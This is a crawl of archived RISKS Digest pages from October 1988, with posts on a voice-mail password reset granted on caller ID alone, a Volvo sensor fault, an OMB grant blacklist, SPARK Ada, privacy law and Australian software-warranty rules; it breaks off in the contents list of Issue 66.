<H3><A NAME="subj4.1">
Intersection of ANI and Voice Mail Risks
</A>
</H3>
<address>
&lt;<A HREF="mailto:MCCLELLAND_G%CUBLDR@VAXF.COLORADO.EDU">
MCCLELLAND_G%CUBLDR@VAXF.COLORADO.EDU
</A>&gt;
</address>
<i>
Tue, 11 Oct 88 00:14 MDT
</i><PRE>

   Recent reports in RISKS of nefarious deeds committed by hackers who
entered a system via voice mail prompted me to inquire about the voice mail
security of my university's system.  A year ago the U bought its own fancy
switch for on-campus communications.  Some of the goodies include voice
mail and ANI.  I tried the voice mail once but since I much prefer e-mail
I long ago forgot my voice mail password (yep, only 4 digits if the
hackers want to start guessing).  I called the telecommunications office
to determine where I needed to go in person and with how many photo ID's
to get my voice mail password.  Even though I hadn't identified myself,
the clerk said, "Oh that won't be necessary, Mr. McClelland, I'll just
change your password back to the default password and you can then change
it to whatever you want."  I said, "But how do you know that I'm
McClelland?"  He replies, "Because it shows on the digital display on my
phone both the phone number and name of the caller."  [Most phones are in
private offices so a unique name can be attached to each number.]  I tried
to explain that all he really knew was that I was someone calling from the
phone in McClelland's office and that I could be the janitor, a grad
student, or almost anyone.  But security wasn't his problem so he wasn't
very concerned.  I was afraid to ask how many folks never bother to change
their default password.  As I was about to hang up, he said, "By the way, if
you check your voice mail from your own extension you don't even need to enter
your password."  I said , "Thanks, that's reassuring" but I don't think he
caught the sarcasm.
  Gary McClelland  

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
New Feynman book
</A>
</H3>
<address>
Eugene Miya 
&lt;<A HREF="mailto:eugene@amelia.nas.nasa.gov">
eugene@amelia.nas.nasa.gov
</A>&gt;
</address>
<i>
Wed, 12 Oct 88 23:41:09 PDT
</i><PRE>

I remembered that many fans of RISKS are also Richard Feynman fans.
I ran into Stacey's briefly today and just happened to see this:

%A Richard P. Feynman
%T "What Do YOU Care What Other People Think?"
%I W. W. Norton
%C New York
%D 1988
%$ 18

Relevance to RISKs readers comes in two forms (his essay on the Value
of Science at the end and the appendix to the Challenger report
which makes up over 50% of the book).  Note that the text is longer
and not verbaum to the articles in Engineering and Science or Physics Today.

--eugene miya,   NASA Ames

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
High `Rev'ing Volvo
</A>
</H3>
<address>
&lt;<A HREF="mailto:hartel@mitre.arpa">
hartel@mitre.arpa
</A>&gt;
</address>
<i>
Tue, 11 Oct 88 10:10:15 EDT
</i><PRE>

I have an old disreputable '82 Volvo which gave me an object lesson in sensor
circuit design recently.  Beginning several months back the car began to
exhibit a mind of its own about engine speed.  The local ace Volvo dealer
couldn't find anything wrong after $400 worth of effort, and since the car's
independence of mind seemed to be limited to brief and infrequent periods, I
let the matter slide.  Poor idea.  I took the car to the wilds of northern
Wisconsin, far from the nearest Volvo fixit shop, where the old car turned on
me.  Previously my problems with engine speed had been limited to surges in
speed at idle, up to no more than 2500 RPM.  There had been no signs of bad
behavior when the car was in gear.  Once up in the great frozen north however,
the car decided it was going to idle at fifty MPH, as in 2700 RPM in fourth
gear up a hill.  Kept doing it too.  Made it hard to drive thru the camp
ground, observe nature, stay alive.

I studied the owner's manual.  It has an elementary schematic of the fuel
system, and one particular element which caught my eye was the constant idle
control, a servo motor that appeared to affect manifold vacuum.  Got inputs
from several sensors and the engine microprocessor.  When I disconnected the
control, idle dropped to nominal, and the car was drivable.

In the end the Volvo dealer found the problem, which was that a spade connector
had come adrift from one of the engine sensors.  The idle control interpreted
lack of signal from the sensor as low engine speed, so it exerted its maximum
effort to raise the idle speed to acceptable levels.  It strikes me as poor
design that an open circuit mimics the operative signal in a sensor system.
Automotive engine compartments are well knows as hell on earth for electronics,
and loose connections and broken wires are to be expected.  Lack of signal
should cause the automated system to go off line, not off its head.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Stevie Wonder gives an Ear-itating Performance
</A>
</H3>
<address>
mjj@stda.jhuapl.edu (Marshall Jose) 
&lt;<A HREF="mailto:@aplvax.jhuapl.edu:mjj@ ..">
@aplvax.jhuapl.edu:mjj@ ...
</A>&gt;
</address>
<i>
Tue, 11 Oct 88 11:06:37 EDT
</i><PRE>

     The following is regrettably anecdotal and I wish I had more
firsthand info on it; anyway, here goes:

     For one of his tours, Stevie Wonder contracted with Northwest Sound
to build a set of PA speakers of extraordinary capability -- response
nearly flat out to 45 kHz, etc.  A few weeks into the tour, though,
the performances seemed to be souring.  Everybody -- artists, crew,
even the audience -- seemed irritable and impatient.  Indeed, the
performances started out well enough, but an hour or so into the
show the audience became testy and actually were moved to boo during
pauses, for no apparent reason.

     Finally, during one show, one of the sound guys was examining
the audio spectrum analyzer screen, and mistakenly pushed the 20 kHz -
200 kHz range button instead of the 2 kHz - 20 kHz button.  Imagine
his alarm at the sight of a potent 28 kHz component, the product of
all the synthesizers' DAC update clocks.  It was lying just outside
the (ordinarily) high hearing limit of 20 kHz, so it was never noticed
by the sound crew and their instrumentation.  Cause discovered, the
noxious 28 kHz spike was eliminated with an equalizer, and everybody
went home happy but chastened.

     The person who related this story to me suspects that the event
is not widely known, being of large embarrassment and trivial cause.
Is he right?  Has anyone else heard about this?

</PRE>
<HR><H3><A NAME="subj7.2">
Ear-itation
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Wed, 12 Oct 88 15:00:28 PDT
</i><PRE>

I am reminded of the not-computer-related experience of the Columbia professor
who noticed that his body went limp in a record store whose speakers were
blaring a particular rock tune.  He took the record back to his lab and
analyzed it -- discovering some sort of a alpha- or beta-wave resonant
frequency with the human brain of his students, for that particular rhythm --
an AN-A-PEST with the accent on the last syllable -- DA-DA-DUM.  It was many
years ago, but still worth relating for the younger folks who like to listen to
hard-beat music...  Beware of the anapest.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
     OMB "Blacklist"?
</A>
</H3>
<address>
Hugh Miller 
&lt;<A HREF="mailto:@CORNELLC.CCS.CORNELL.EDU:HUGH@vm.utcs.utoronto.ca">
@CORNELLC.CCS.CORNELL.EDU:HUGH@vm.utcs.utoronto.ca
</A>&gt;
</address>
<i>

</i><PRE>
To: RISKS Moderator &lt;RISKS@csl.sri.com&gt;

        The following appeared in the 1987 annual report of Project Censored,
a U.S. group operating out of Sonoma State University.  They compile an annual
list of what they consider to be the 25 most un- or under-reported stories of
the year.  This is #22 on the latest hit parade.  The collection is widely
available on local RCPM's; the one I pulled down was labelled CENSOR.ARC.
[Hugh Miller, University of Toronto, (416)536-4441]

                OMB COMPILING NATION-WIDE BLACKLIST OF GRANT VIOLATORS

                The Office of Management and Budget is compiling a master
         computer list of those debarred or suspended from participating in
         government agency grant programs. Gary Bass, executive director of
         OMB Watch, a public interest group that monitors the budget office,
         said the goal of reducing waste, fraud and abuse is laudable but
         warned that the program "can become a hit list for individuals and
         organizations that the administration does not agree with."
                The controversial program will cover a wide range of
         transactions, including grants, cooperative agreements, scholarships,
         fellowships, loans and subsidies. It would apply to both recipients
         of federal funds and those "doing business" with them.  The system is
         expected to be fully operational by May, 1988.
                Under the new law (Reagan's Executive Order 12549), 20
         agencies which disburse $100 billion in grants will forward their
         debarred lists to the OMB. The master list will be computerized and
         placed on a nation-wide automated telephone system.  Regulations
         published in the Federal Register (5/29/87) say that the master list
         will contain names and "other information" about currently debarred
         or suspended grant recipients, as well as about those whose debarment
         is pending.
                Under the directive, federal, state and local agencies,
         private organizations and individuals handling federal funds must
         check the list before providing anyone a federally-aided service,
         grant, loan or other assistance such as day care.  Any person or
         organization that fails to check the list may also be placed on it.
         In addition, employees of federally-funded agencies and
         organizations, as well as anyone "doing business" with them or
         wishing to do business with them must submit annual certifications
         that neither they nor anyone "associated with" them are on the list,
         or being considered for it.
                Grounds for placement on the list include 1) violating any
         term of a "public agreement," regardless of whether federal funds
         were involved; 2) failure to repay a government-backed or assisted
         loan, such as a home mortgage, student or crop loan; 3) "failure to
         perform" or poor performance on a grant or other "public agreement;"
         4) lack of "business integrity or honesty" or conviction of
         "business" crimes; 5) debarment or suspension by a public agency at
         any level of government, federal, state, or local.
                One can also make the blacklist if one: is a public school
         teacher and goes on strike despite a no-strike clause in one's
         contract; performs poorly on any grant from a public agency,
         regardless of whether federal funds were involved; does business with
         anyone known to be on OMB's new list.
                Various agencies already keep records of those who violate
         rules of grants, using the lists to prevent such recipients from
         getting additional grants from the agency involved. But, under
         current law those same recipients may obtain grants from other
         federal agencies.
                Rep. Jack Brooks (D-TX), chair of the House Government
         Operations Committee warned that the OMB's implementing guidelines
         "endorse guilt by association, reverse the presumption that a person
         is innocent until proven guilty, and define the operative offenses so
         vaguely as to potentially encompass many entirely legitimate
         activities."

                SOURCES: THE NEW YORK TIMES, 12/23/87, "U.S. Plans to Make
         Master List ...", by Martin Tolchin; OMB WATCH 1987 ANNUAL REPORT;
         FOUNDATION NEWS, July/August 1987, page 8.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: Ethics of Conflict Simulation
</A>
</H3>
<address>
wilde@hor-res.UUCP  
&lt;<A HREF="mailto:@RELAY.CS.NET:hor-res!wilde@gte.com">
@RELAY.CS.NET:hor-res!wilde@gte.com
</A>&gt;
</address>
<i>
Mon Sep 26 15:08:41 1988
</i><PRE>

In RISKS-FORUM 7.55, Mike Trout makes several statements regarding the
past and present state of the conflict simulation industry.  While I
do not wish to digress too far from the purpose of this list, I feel that
the picture he presents is somewhat inaccurate.

The main issue confronting game designers doing work for the military
is one of integrity, as Mike pointed out.  The problem is not some nebulous
fear of the Pentagon "poisoning" the industry as a whole, but rather
that they would interfere _with the particular game under consideration_.
The designers want to be free to model a situation as they see it.  The
military, however, gets upset when someone gives them a simulation that
says their high tech weapons have an expected lifetime of 3 minutes in
actual combat.  As a result, most designers will not consider working
for the govt. unless they are assured of complete freedom in doing their
designs.

As for Pentagon influence "subverting" the game industry, I have yet to see 
any indication that anything more than a small fraction of game designers
and publishers revenues come from military contracts.  Many games have been
produced dealing with hypothetical modern conflicts, but I believe this is
a reflection of the interests of gamers , not the result of some sinister
military infiltration.  I definitely feel there is no justification for
saying these games were developed to find "better ways to slaughter people".
Only a handful of games on the market were originally developed as
simulations for the military.  

Mike's statement about having fun is somewhat puzzling.  These designs
are _GAMES_. Most people play them for the enjoyment of intellectual
competition.  They also play them to more fully understand history (and 
future possibilities).  The two are not incompatible goals.

Scott Wilde            ...bunny!hor-res!wilde  

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.63.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.65.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-17</DOCNO>
<DOCOLDNO>IA012-000131-B034-319</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.65.html 128.240.150.127 19970217023435 text/html 19661
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:33:06 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 65</TITLE>
<LINK REL="Prev" HREF="/Risks/7.64.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.66.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.64.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.66.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 65</H1>
<H2> Saturday 15 October 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Vendor introduces "safe" Ada subset 
</A>
<DD>
<A HREF="#subj1.1">
Jonathan Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: ethics of conflict simulation 
</A>
<DD>
<A HREF="#subj2.1">
Sean Malloy
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Assault on Privacy 
</A>
<DD>
<A HREF="#subj3.1">
Ronni Rosenberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Software warranties and Trade Practices in Australia     
</A>
<DD>
<A HREF="#subj4.1">
B L Coombs annoted by "cbp"
</A><br>
<A HREF="#subj4.2">
 via Lee Naish
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  RISKS of EPROMS 
</A>
<DD>
<A HREF="#subj5.1">
George Sukenick
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Vendor introduces "safe" Ada subset
</A>
</H3>
<address>
jon@june.cs.washington.edu 
&lt;<A HREF="mailto:Jonathan Jacky, University of Washington">
Jonathan Jacky, University of Washington
</A>&gt;
</address>
<i>
Fri, 14 Oct 88 09:04:38 PDT
</i><PRE>

From ELECTRONIC ENGINEERING TIMES, 26 Sept 1988, p. 25:

Ada SUBSET ADDRESSES SOFTWARE SAFETY

Southampton, England - (A subset of Ada called Spark) is reported to overcome
the drawbacks of (Ada) in applications where software integrity is critical.
...  Spark was developed at the University of Southampton with the sponsorhip 
of the British Ministry of Defence.  It is now being marketed by Program
Validation Ltd.

(A representative of Program Validation) said that the use of Ada for safety
critical programming poses some serious problems.  There is no formal
definition of the language and the precise meaning of some its constructions is
unclear.  According to Program Validation, the resulting uncertainties make
formal verification of Ada programs impossible and cast doubts on the integrity
of the compiled code.  A further complication is that the richness of Ada
allows programs to be constructed that are apparently simple, but hide great
underlying complexity.

... To achieve Ada integrity, Spark has introduced several restrictions.  It
does not allow the use of tasks, exceptions or generic units.  Access types 
are also omitted, as these are considered unacceptable in real-time safety
critical applications.  ... Certain features - such as "go to" statements
and "declare" statements - are totally barred.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: ethics of conflict simulation
</A>
</H3>
<address>
Sean Malloy
&lt;<A HREF="mailto:malloy@nprdc.arpa ">
malloy@nprdc.arpa 
</A>&gt;
</address>
<i>
Thu, 13 Oct 88 13:40:12 PDT
</i><PRE>

&gt;From RISKS-FORUM 7.74: (Scott Wilde)    The problem is not some nebulous
&gt;fear of the Pentagon "poisoning" the industry as a whole, but rather
&gt;that they would interfere _with the particular game under consideration_.

In fact, one of the games designed by Simulations Publications, Inc. (SPI)
before they were bought out by TSR was _ordered_ by the Army.  _Firefight_ was
intended as a simulation for warfare in Europe, to teach tactics to infantry
and armor commanders. Within a number of simplifying abstractions, it modeled
the weapons systems available to a unit commander in Germany.

SPI later made this game available as part of their regular line. It soon
became apparent that the game was not only useful for teaching tactics, it was
also a device to build confidence and improve morale -- the way the rules and
weapons systems data were set up, it was almost impossible for a Soviet player
to pull anything better than a draw out of the game. The game mechanics were
biased so that an American player could win by using the `right' tactics
(`right' in the Army sense -- the approved Army tactics for a given situation),
rather than encouraging the players to come up with their own tactics.

&gt;From the Army's point of view, it was a very good simulation. From the
opinions expressed about it in the gaming community, it flopped
miserably as a _game_.

Sean Malloy, Navy Personnel Research &amp; Development Cntr, San Diego CA 92152-6800

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: Assault on Privacy
</A>
</H3>
<address>
Ronni Rosenberg 
&lt;<A HREF="mailto:ronni@VX.LCS.MIT.EDU">
ronni@VX.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Thu, 13 Oct 88 13:36:10 edt
</i><PRE>

Thanks to Anthony Atkielski for providing information on privacy legislation
in France.  I hope that France's legislation closes some of the loopholes in
U.S. privacy legislation.  But it is worth pointing out that laws that may
sound good on the books often do not translate into tough action.

For instance, the Fair Credit Reporting Act (1971) specifies expiration
periods, for bankruptcy data (14 years) and other adverse data (7 years),
which is not well defined.  Where legislation contains vague definitions,
applying it may be left to the judgement of the agency being regulated.

The FCRA also requires credit agencies to provide you with the data in their
file about you, on request, and to allow you to correct it.  Sounds good.
But you can get such info. for free only after you have been denied credit on
the basis of it.  If you want to get the info. before you have a problem, it's
not too expensive, but you'll have quite a time trying to find all the private
organizations that maintain files about you.  If you make a correction, there
is no guarantee that it will be propogated to other files based on this one
and to other organizations that obtained the false data previously.  And if
you lost something, such as a mortgage, because of false data, tough luck.

The Privacy Act (1974) makes it easier for people to know about their files
(in government agencies and the private organizations with which they do
business).  But publication of the existence of records is done in the Federal
Register, which is not exactly handy.

Agencies are restricted from releasing personal data to another agency without
written permission of the person who provided the data, except for "routine"
purposes.  In 1979, the Office of Personnel Management released lots of its
data to other agencies.  What was the "routine" purpose?  "To protect the
legitimate interests of government."  Similar definitions can be used to
"justify" the collection of any sort of info.

Atkielski thinks that individuals in France can insist that a credit bureau
erase its file about themselves.  But if society is structured so that many of
the normal transactions of life depend on credit ratings, how real a "choice"
do you have about participating?

I wish much more of the burden were on the organizations that maintain (and,
in many cases, profit from) data banks.  I'd like to see organizations held
responsible for notifying individuals directly about the existence of files
about themselves; requesting permission from individuals every time info. is
released; guaranteeing that corrections will be made and propogated quickly;
assuming liability for losses based on false data; and so on.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Software warranties and Trade Practices in Australia
</A>
</H3>
<address>
Lee Naish
&lt;<A HREF="mailto:lee@munmurra.mu.oz.au ">
lee@munmurra.mu.oz.au 
</A>&gt;
</address>
<i>
Wed, 12 Oct 88 13:43:36 EST
</i><PRE>
Organization: University of Melbourne, Comp Sci Dept

        [This was picked off the net in Australia, from "cbp",
        including and commenting on a letter from B L COOMBS.  Lee]

Software Warranties - The Truth

[The Trade Practices Commission recently sent the following letter to 2000
Australian computer companies.

Permission has been obtained from Ian Searle of the TPC to reproduce this
letter here
&lt;&lt;i.e.,ACSnet, but I don't think they would mind further distribution&gt;&gt;.]

Trade Practices Commission

18 March 1988

The Commission is concerned that many computer software packages sold in
Australia contain statements which place their suppliers at risk of
contravening the Trade Practices Act. Such contravention, if proven in court,
can lead to penalties of up to $20,000 for an individual or $100,000 for a
corporation.

2. Legal action is not contemplated by the Commission at this time, but the
Commission is concerned that suppliers become aware of their obligations under
the Act and comply with it for the benefit of their customers as well as
avoiding risk of legal action against them by either the Commission, a customer
or a competitor.

3. The Trade Practices Act implies into consumer transactions broad warranties,
conditions, rights and remedies with cannot be restricted, modified or
excluded. Any attempt to do so is void and places suppliers at risk of
contravening the Act.

4. A sample of software documentation examined by the Commission indicates that
statements which attempt to limit, or exclude altogether, all warranties
whether expressed or implied are quite common. Other statements considered
likely to mislead consumers as to their legal rights and remedies were also
detected. A number of these statements and the sections of the Act they are
likely to contravene are set out in Attachment A.

5. With the large number of suppliers in the industry the Commission is of
course not aware of the documentation of each supplier and is thus unable to
comment specifically on individual documentation at this stage and some may
well already comply with the Act. You are however urged to consider the
documentation of software supplied by you and the representations made by your
employees (and, if appropriate, by distributors and retailers supplying your
software) to ensure that they do comply with the Act. This consideration should
encompass a review of representations made regarding the capabilities of the
software. When modification to documentation is required you should not neglect
current stocks held by you (and your distributors and retailers, if
appropriate) as well as having documentation for future stocks modified.

6. When reviewing the documentation where warranties and customers' rights are
discussed, the Commission considers it prudent that a statement such as the
following be included to ensure the documentation proceeds on an accurate
positive footing and in a manner not likely to mislead or deceive -

"The benefits conferred by this warranty are in addition to all other rights
and remedies you have in respect of the product under the Trade Practices Act
and similar State and Territory laws".

7. The Commission will continue to monitor the documentation associated with
computer software and, if the incidence of statements which contravene the Act
continues, will consider what further action it should take.

8. If you have any queries regarding software documentation or think the
Commission may be able to assist you generally, please contact John Nicholl of
this office (telephone 062-642918).

Yours faithfully

(signed) B L COOMBS

Assistant Commissioner, Fair Trading and Consumer, Protection Branch


ATTACHMENT A

Sample Statements from Software Packages

(i) General Exclusion

"Except as hereafter provided the program(s) is(are) provided "as is" without
warranty of any kind, either expressed or implied, including, but not limited
to the implied warranties of merchantability and fitness for a particular
purpose. The entire risk as to the quality and performance of the program(s) is
with you. Should the program(s) prove defective, you (and not the licensor or
its authorized dealers) assume the entire cost of all necessary servicing,
repair or correction."

Comment:

The conditions and warranties implied and the rights and remedies created by
the Trade Practices Act cannot be restricted, modified or excluded. Any attempt
to do so is void. Statements of this type are therefore void and put suppliers
at risk of contravening section 53(g) of the Act which prohibits false or
misleading representations concerning the existence, exclusion or effect of any
condition, warranty, guarantee, right or remedy. Suppliers would also be at
risk under section 52 of the Act which prohibits misleading or deceptive
conduct.

(ii) No Refunds If Package Opened

"No refunds will be given for products that have an opened disk package".

Comment:

Consumers have a non-excludable right under the Trade Practices Act to rescind
the contract, return the goods and obtain a refund where there has been a
breach of a condition implied by the Act (which include conditions of
merchantable quality and fitness for purpose). Statements such as this are void
and place suppliers at risk of contravening sections 52 and 53(g) of the Act.

(iii) Express Warranties

"No oral or written information or advice given by the company, its dealers,
distributors, agents, or employees shall create a warranty or in any way
increase the scope of this warranty and you may not rely on any such
information or advice".

Comment:

Consumers have a right under the Trade Practices Act to recover loss or damage
arising from the failure of the manufacturer or importer to comply with an
"express warranty" (briefly, an assertion or representation about the goods
likely to induce a person to acquire them). There may be cases where assertions
or statements by the company's dealers, distributors, agents or employees may
constitute an "express warranty" made with apparent authority. It is doubtful
whether a denial of authority in a document likely to come to a customer's
notice, if at all, after the transaction is concluded would be sufficient to
rebut the presumption (inferred under the Act) that the "express warranty" was
in such cases given by, or for, the company. Statements such as this may place
suppliers at risk of contravening sections 52 and 53(g) of the Act.

(iv) Time Limits

"All implied warranties on the media and manual, including implied warranties
of merchantability and fitness for a particular purpose, are limited in
duration to ninety (90) days from the date of the original retail purchase of
this product".

Comment:

The duration of the non-excludable conditions and warranties implied under the
Trade Practices Act cannot be limited. Statements which attempt to do so are
void and place suppliers at risk of contravening sections 52 and 53(g) of the
Act. Suppliers can, of course, limit the duration of their express warranty.
However, in doing so suppliers should ensure that consumers will not be likely
to be misled concerning their non-excludable rights and remedies under the
Trade Practices Act.

(v) Forcing Acceptance Of Unseen Terms

"Opening the sealed packet signifies your acceptance of the terms of the
enclosed agreement".

Comment:

Statements of this type may mislead consumers as to their rights to dispute
terms of agreements to which they had no prior access (and which, therefore,
are not binding), and/or terms which may in fact be misleading under the Trade
Practices Act. Such statements place suppliers at risk of contravening sections
52 and 53(g) of the Act.

(vi) State Law Rights

"This warranty gives you specific legal rights, you may have other rights which
vary from state to state. Some states do not allow the exclusion of incidental
or consequential damages, or the limitation on how long an implied warranty
lasts so some of the above may not apply to you".

Comment:

The Trade Practices Act applies throughout Australia to the conduct of
companies generally, and also to unincorporated firms (eg Sole traders,
partnerships, etc) who trade inter-state or within a Territory. The statutory
rights and remedies implied into consumer transactions under the Act cannot be
excluded. These include the right to claim consequential damages in some cases
and a time limit cannot be placed on these rights. Statements such as the above
could therefore mislead consumers as their statutory rights under the Act and
place suppliers at risk under sections 52 and 53(g) of the Act.

cbp@foster.avid.oz - {ACS,CS}net
cbp%foster.oz.au@uunet.uu.net - ARPAnet
...!{hplabs,mcvax,nttlab,ukc,uunet}!munnari!foster.oz.au!cbp - UUCP

</PRE>
<HR><H3><A NAME="subj4.2">
RISKS of EPROMS
</A>
</H3>
<address>
George Sukenick
&lt;<A HREF="mailto:sukenick%ccnysci%cucard@nyu.edu ">
sukenick%ccnysci%cucard@nyu.edu 
</A>&gt;
</address>
<i>
Mon, 10 Oct 88 15:35:08 EDT
</i><PRE>

&gt;  RISKS of EPROMS (Daniel Klein)
&gt;The UV eraseable EPROMS that are found in many smaller computers are also
&gt;subject to failure when their picture is taken.  Yep, you read that correctly.

(Due to camera shy EPROMS? :-))

Electronic flashes draw a lot of current in a short time.  The unshielded
system might have been crashing due to EMP rather than light interfering with
the EPROMs.  I guess that the test would then be to see what happens with
various combinations of covering the EPROM's windows (they were open in the
machine?) and shielding the flash.
					-george

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.64.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.66.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-18</DOCNO>
<DOCOLDNO>IA012-000131-B034-341</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.66.html 128.240.150.127 19970217023449 text/html 13513
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:33:16 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 66</TITLE>
<LINK REL="Prev" HREF="/Risks/7.65.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.67.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.65.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.67.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 66</H1>
<H2> Thursday 20 October 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
British computer calls Northern Ireland a "Region Unknown" 
</A>
<DD>
<A HREF="#subj1.1">
